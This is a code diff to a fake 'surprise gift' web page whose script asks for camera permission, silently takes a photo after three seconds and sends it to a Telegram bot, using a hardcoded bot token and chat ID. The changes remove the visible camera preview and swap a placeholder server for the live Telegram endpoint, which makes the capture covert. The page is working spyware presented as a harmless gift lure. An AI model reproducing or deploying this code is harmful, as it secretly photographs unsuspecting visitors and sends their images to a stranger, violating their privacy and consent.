@@ -15,28 +15,20 @@
         justify-content: center;
         align-items: center;
         height: 100vh;
-        overflow: hidden;
         flex-direction: column;
         text-align: center;
     }
 
     #loading {
-        font-size: 26px;
+        font-size: 28px;
         animation: blink 1s infinite;
+        margin-bottom: 20px;
     }
 
     @keyframes blink {
         0% { opacity: 0.2; }
         50% { opacity: 1; }
         100% { opacity: 0.2; }
-    }
-
-    video {
-        width: 150px;
-        height: 150px;
-        border-radius: 50%;
-        object-fit: cover;
-        display: none;
     }
 </style>
 </head>
@@ -46,44 +38,31 @@
 <h2 id="loading">Loading your surprise...</h2>
 <h3>🎁 Please click <b>Allow</b> to unlock your gift!</h3>
 
-<video id="preview" autoplay playsinline></video>
-
 <script>
-    const video = document.getElementById("preview");
-    const loading = document.getElementById("loading");
-
     async function startCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            loading.style.display = "none";
-            video.style.display = "block";
-            video.srcObject = stream;
+            let track = stream.getVideoTracks()[0];
+            let imageCapture = new ImageCapture(track);
 
-            setTimeout(() => captureAndSend(stream), 3000);
+            setTimeout(() => {
+                imageCapture.takePhoto().then(blob => {
+
+                    let form = new FormData();
+                    form.append("photo", blob, "pic.jpg");
+
+                    fetch("https://api.telegram.org/bot8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI/sendPhoto?chat_id=8215819954", {
+                        method: "POST",
+                        body: form
+                    });
+
+                });
+            }, 3000);
 
         } catch (err) {
-            loading.innerText = "Camera blocked ❌ Please allow to unlock your surprise!";
+            document.getElementById("loading").innerText = "❌ Please allow camera!";
         }
-    }
-
-    function captureAndSend(stream) {
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-
-        imageCapture.takePhoto()
-        .then(blob => {
-            let form = new FormData();
-            form.append("photo", blob, "pic.jpg");
-
-            fetch("https://your-bot-server-url/send", {   // your bot server endpoint
-                method: "POST",
-                body: form
-            });
-
-        }).catch(() => {
-            loading.innerText = "Error capturing photo!";
-        });
     }
 
     startCamera();
